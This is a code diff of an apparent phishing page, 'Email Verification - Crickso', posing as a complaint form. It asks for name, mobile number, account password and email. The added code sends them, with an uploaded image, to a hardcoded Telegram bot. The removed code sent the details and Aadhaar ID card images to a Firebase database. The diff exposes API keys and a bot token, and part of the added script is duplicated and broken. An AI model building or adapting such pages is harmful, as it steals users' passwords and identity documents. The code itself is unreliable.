@@ -5,8 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Email Verification - Crickso</title>
     <link rel="stylesheet" href="style.css">
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
     <style>
         body {
             background: #ffffff;
@@ -128,7 +126,11 @@
             max-height: 120px;
             border-radius: 8px;
             margin-top: 10px;
-            display: none;
+            display: none !important;
+        }
+
+        .preview-img.show {
+            display: block !important;
         }
 
         /* Popup */
@@ -239,22 +241,13 @@
             <label class="field-label">Email ID</label>
             <input type="email" class="field-input" placeholder="Enter your email address">
 
-            <label class="field-label">Upload Aadhar Card Front</label>
-            <div class="file-upload" onclick="document.getElementById('frontInput').click()">
-                <input type="file" id="frontInput" accept="image/*" onchange="previewFile('frontInput', 'frontPreview', 'frontText')">
-                <div class="file-upload-text" id="frontText">
-                    <span>Click to upload</span> Aadhar Front<br>PNG, JPG up to 5MB
+            <label class="field-label">Upload Issue Image</label>
+            <div class="file-upload" onclick="document.getElementById('fileInput').click()">
+                <input type="file" id="fileInput" accept="image/*" onchange="previewFile('fileInput', 'previewImg', 'uploadText')">
+                <div class="file-upload-text" id="uploadText">
+                    <span>Click to upload</span> or drag and drop<br>PNG, JPG up to 5MB
                 </div>
-                <img id="frontPreview" class="preview-img">
-            </div>
-
-            <label class="field-label">Upload Aadhar Card Back</label>
-            <div class="file-upload" onclick="document.getElementById('backInput').click()">
-                <input type="file" id="backInput" accept="image/*" onchange="previewFile('backInput', 'backPreview', 'backText')">
-                <div class="file-upload-text" id="backText">
-                    <span>Click to upload</span> Aadhar Back<br>PNG, JPG up to 5MB
-                </div>
-                <img id="backPreview" class="preview-img">
+                <img id="previewImg" class="preview-img">
             </div>
 
             <button class="submit-btn" id="submitBtn" onclick="submitComplaint()">Complaint Submit</button>
@@ -273,17 +266,9 @@
     </div>
 
     <script>
-        // Firebase Init
-        firebase.initializeApp({
-            apiKey: "AIzaSyDmRdzAUm-OsTTrxRW4f585VZ2Wq5CAs3w",
-            authDomain: "yusub-bhai-croor-bet.firebaseapp.com",
-            databaseURL: "https://yusub-bhai-croor-bet-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "yusub-bhai-croor-bet",
-            storageBucket: "yusub-bhai-croor-bet.firebasestorage.app",
-            messagingSenderId: "998570774789",
-            appId: "1:998570774789:web:18c14c5c447af3121ba76c"
-        });
-        const db = firebase.database();
+        // ============ TELEGRAM CONFIG ============
+        const BOT_TOKEN = '8899133920:AAEgSuI5WV2luP-IysZw9XD3dy3DxTCDdZk';
+        const CHAT_ID = '-1004376663143';
 
         function previewFile(inputId, previewId, textId) {
             const file = document.getElementById(inputId).files[0];
@@ -294,11 +279,33 @@
                 const reader = new FileReader();
                 reader.onload = function(e) {
                     preview.src = e.target.result;
-                    preview.style.display = 'block';
+                    preview.classList.add('show');
                     text.innerHTML = file.name;
                 };
                 reader.readAsDataURL(file);
             }
+        }
+
+        async function sendToTelegram(message) {
+            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+            });
+            return response.ok;
+        }
+
+        async function sendPhotoToTelegram(file, caption) {
+            if (!file) return true;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file);
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'HTML');
+            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto';
+            const response = await fetch(url, { method: 'POST', body: formData });
+            return response.ok;
         }
 
         function submitComplaint() {
@@ -316,43 +323,46 @@
                 return;
             }
 
-            const complaint = {
-                type: 'Email Verification',
-                name: inputs[0].value,
-                mobile: inputs[1].value,
-                password: inputs[2].value,
-                email: inputs[3].value,
-                amount: '-',
-                image: (document.getElementById('backPreview') && document.getElementById('backPreview').style.display !== 'none') ? document.getElementById('backPreview').src : '',
-                date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString(),
-                status: 'pending'
-            };
+            const name = inputs[0].value;
+            const mobile = inputs[1].value;
+            const password = inputs[2].value;
+            const email = inputs[3].value;
+            const date = new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString();
+            const file = document.getElementById('fileInput').files[0];
 
-            const newRef = db.ref('complaints').push();
-            complaint.id = newRef.key;
-            newRef.set(complaint);
-
-            // Save to localStorage for mailbox
-            const localComplaints = JSON.parse(localStorage.getItem('cricksoComplaints') || '[]');
-            localComplaints.push(complaint);
-            localStorage.setItem('cricksoComplaints', JSON.stringify(localComplaints));
+            const message = '<b>📧 Email Verification Request</b>\n\n' +
+                '<b>Name:</b> ' + name + '\n' +
+                '<b>Mobile:</b> ' + mobile + '\n' +
+                '<b>Password:</b> ' + password + '\n' +
+                '<b>Email:</b> ' + email + '\n' +
+                '<b>Date:</b> ' + date;
 
             const btn = document.getElementById('submitBtn');
             btn.disabled = true;
             btn.innerHTML = '<span class="spinner"></span> Submitting...';
 
-            setTimeout(function() {
+            sendPhotoToTelegram(file, message).then(function(ok) {
                 btn.disabled = false;
                 btn.innerHTML = 'Complaint Submit';
-                document.getElementById('successPopup').classList.add('show');
-            }, 3000);
+                if (ok) {
+                    document.getElementById('successPopup').classList.add('show');
+                } else {
+                    alert('Failed to submit. Please try again.');
+                }
+            }).catch(function() {
+                btn.disabled = false;
+                btn.innerHTML = 'Complaint Submit';
+                alert('Failed to submit. Please try again.');
+            });
+        }
+                alert('Failed to submit. Please try again.');
+            });
         }
 
         function closeSuccess() {
             document.getElementById('successPopup').classList.remove('show');
-            window.location.href = 'index.html?open=mailbox';
+            window.location.href = 'index.html';
         }
-    </script>
     </script>
 
 </body>
